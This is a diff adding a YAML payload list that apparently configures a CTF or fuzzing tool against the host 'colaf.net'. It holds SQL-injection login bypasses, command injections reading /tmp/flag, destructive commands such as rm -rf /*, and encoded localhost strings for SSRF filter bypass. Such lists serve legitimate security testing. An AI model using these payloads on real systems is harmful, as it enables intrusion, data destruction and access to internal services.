@@ -1,0 +1,45 @@
+host: 'colaf.net'
+port:
+  - 0
+  - 1
+  - 7
+  - 9
+payloadSQL:
+  - admin\' OR \'1
+  - admin\' OR 1 -- -
+  - admin\' || \'1
+  - \" OR \"\" = \"
+  - \" OR 1 = 1 -- -
+  - \'=\'
+  - \'LIKE\'
+  - \'=0--+
+payloadCommandInjection:
+  - ;ls \".\"
+  - \";ls \".
+  - ;pwd
+  - \";pwd \"
+  - ;cat /tmp/flag
+  - \";cat /tmp/flag
+payloadCommand:
+  - rm ./
+  - rm -rf ./*
+  - rm -rf /*
+  - cp -rf ./* ../
+  - cat /
+  - clear
+  - ping http://localhost
+  - whois https://naver.com
+  - '가나다'
+payloadLocalhost:
+  - http://localhost
+  - http://vcap.me
+  - http://0x7f.0x00.0x00.0x01
+  - http://0x7f000001
+  - http://2130706433
+  - http://Localhost
+  - http://127.0.0.255
+  - http://127.1
+
+ip:
+  - 127.0.0.1
+  - 127.0.0.2
